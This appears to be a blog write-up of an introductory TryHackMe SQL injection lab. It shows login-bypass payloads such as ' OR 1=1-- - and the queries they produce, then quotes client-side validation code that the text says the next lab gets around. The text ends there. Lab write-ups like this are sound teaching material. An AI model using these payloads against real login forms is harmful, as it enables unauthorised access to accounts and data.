---
layout: post
title: "TryHackMe — SQL Injection Lab [Write-up]"
date: 2026-07-01
platform: thm
difficulty: Easy
category: write-up
tags: [web, sqli]
description: "SQL Injection Lab"
---

## Overview

**Machine:** SQL Injection Lab  
**Platform:** TryHackMe  
**Difficulty:** Easy  

---

## Introduction

This room is meant as an introduction to SQL injection and demonstrates various SQL injection attacks

## SQL Injection 1: Input Box Non-String

---

Starting with the first lab, we're greeted by a login form. If we enter random data, we can see our request at the bottom. Since this request accepts non-string data, our payload will look like this: 

---

```python

```python
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=test AND password = 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'
```

```python
1 or 1=1-- -
```

---

And then the database query will look like this

```python
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 or 1=1-- - AND password = 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'
```

## SQL Injection 2: Input Box String

The next lab accepts string data, so our payload will look like this 

---

```python
' OR 1=1-- -
```

and the database query will look like this 

```python
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '' OR 1=1-- -' AND password = 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'
```

## SQL Injection 3 and 4: URL and POST Injection

At this level, the request is the same as in Option 2, but user input cannot be entered directly into the application via the login form because certain client-side controls have been implemented:

```javascript
functionvalidateform() {
    var profileID = document.inputForm.profileID.value;
    var password = document.inputForm.password.value;

    if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
alert("The input fields cannot contain special characters");
        return false;
    }
    if (profileID == null || password == null) {
alert("The input fields cannot be empty.");
        return false;
    }
}
```


